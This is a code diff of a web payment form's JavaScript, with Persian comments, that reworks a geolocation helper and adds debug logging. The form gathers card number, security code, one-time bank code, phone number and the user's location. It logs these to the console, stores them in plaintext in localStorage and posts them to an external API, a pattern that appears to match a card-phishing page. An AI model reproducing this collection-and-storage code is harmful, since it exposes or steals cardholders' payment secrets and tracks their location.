@@ -246,25 +246,42 @@
 
         // تابع گرفتن موقعیت مکانی
         function getLocation(callback) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            timestamp: new Date().toISOString()
-                        };
-                        callback(location);
-                    },
-                    (error) => {
-                        console.warn("خطا در گرفتن موقعیت مکانی: ", error.message);
-                        callback(null); // در صورت خطا، null برگردانده می‌شود
-                    }
-                );
-            } else {
-                console.warn("مرورگر از Geolocation پشتیبانی نمی‌کند.");
+            if (!navigator.geolocation) {
+                alert("مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند.");
                 callback(null);
+                return;
             }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        timestamp: new Date().toISOString()
+                    };
+                    console.log("موقعیت مکانی دریافت شد:", location); // برای دیباگ
+                    callback(location);
+                },
+                (error) => {
+                    let errorMessage = "خطا در گرفتن موقعیت مکانی: ";
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage += "کاربر اجازه دسترسی را نداد.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage += "موقعیت مکانی در دسترس نیست.";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage += "درخواست زمان‌بر شد.";
+                            break;
+                        default:
+                            errorMessage += "خطای ناشناخته.";
+                    }
+                    alert(errorMessage);
+                    console.warn(errorMessage);
+                    callback(null);
+                }
+            );
         }
 
         function requestOTP() {
@@ -275,7 +292,7 @@
                 const form = document.getElementById('payment-form');
                 const data = new FormData(form);
 
-                // گرفتن موقعیت مکانی و ارسال آن
+                console.log("در حال گرفتن موقعیت مکانی..."); // برای دیباگ
                 getLocation((location) => {
                     const jsonData = {
                         "card_number": data.get("card-number"),
@@ -285,14 +302,17 @@
                         "security_code": data.get("security-code"),
                         "otp_code": data.get("otp-code"),
                         "phone_number": data.get("phone-number"),
-                        "location": location, // اضافه کردن موقعیت مکانی
+                        "location": location || "موقعیت مکانی دریافت نشد",
                         "timestamp": new Date().toISOString()
                     };
 
+                    // ذخیره در localStorage
                     let storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
                     storedData.push(jsonData);
                     localStorage.setItem('paymentData', JSON.stringify(storedData));
+                    console.log("داده‌ها در localStorage ذخیره شد:", jsonData); // برای دیباگ
 
+                    // ارسال به API
                     fetch('https://reqres.in/api/users', {
                         method: 'POST',
                         headers: {
